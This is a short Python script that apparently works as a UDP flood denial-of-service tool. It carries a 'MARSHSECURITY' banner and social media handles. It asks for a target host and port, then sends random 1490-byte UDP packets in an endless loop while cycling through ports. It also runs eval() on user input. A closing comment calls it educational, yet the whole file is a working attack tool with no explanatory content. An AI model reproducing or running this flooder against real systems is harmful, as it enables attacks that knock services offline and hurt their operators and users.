try:
    import sys
    import os
    import time
    import socket
    import socket as s
    import random
    import colorama
    from colorama import Fore, Back
    from datetime import datetime
except ImportError:
     exit("Install requirements and try again ... ")
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
colorama.init(autoreset=True)
try:
   os.system("clear")
except:
     os.system("cls")
banner = Fore.YELLOW + f"""

oooo     oooo      o      oooooooooo   oooooooo8 ooooo ooooo ooooooooo  ooooooooo     ooooooo    oooooooo8  
 8888o   888      888      888    888 888         888   888   888    88o 888    88o o888   888o 888         
 88 888o8 88     8  88     888oooo88   888oooooo  888ooo888   888    888 888    888 888     888  888oooooo  
 88  888  88    8oooo88    888  88o           888 888   888   888    888 888    888 888o   o888         888 
o88o  8  o88o o88o  o888o o888o  88o8 o88oooo888 o888o o888o o888ooo88  o888ooo88     88ooo88   o88oooo888   {hour}:{minute}  | {day}.{month}.{year}
                                                   
Telegram : @MarshSecurity
Twitter : @Marsh_Security

"""
print(banner)
while True:
      ips = input("URL or IP of Target : ").lower()
      try:
             ip = s.gethostbyname(ips)
             break
      except:
             print(Fore.RED + "ERROR :  Please enter valid IP or URL or try with no https:// or http://")

print(Fore.YELLOW + f"TARGET SET ==>> {ips}" + Fore.YELLOW)
port = eval(input("Port  : "))
try:
   os.system("clear")
except:
     os.system("cls")
print(banner)
print(Back.GREEN + "Attack is startring...")
print("[                    ] 0% ")
time.sleep(2)
print("[=====               ] 25%")
time.sleep(2)
print("[==========          ] 50%")
time.sleep(2)
print("[===============     ] 75%")
time.sleep(2)
print("[====================] 100%")
time.sleep(2)
sent = 0
while True:
     sock.sendto(bytes, (ip,port))
     sent = sent + 1
     port = port + 1
     print(Fore.YELLOW + "%s packet send ====>>>>>> %s      [[  %s  ]]"%(sent,ips, ip))
     if port == 65534:
       port = 1


#CODE BY @MARSHSECURITY, AND I DID THIS CODE FOR ONLY EDUCATIONAL PURPOSE ....
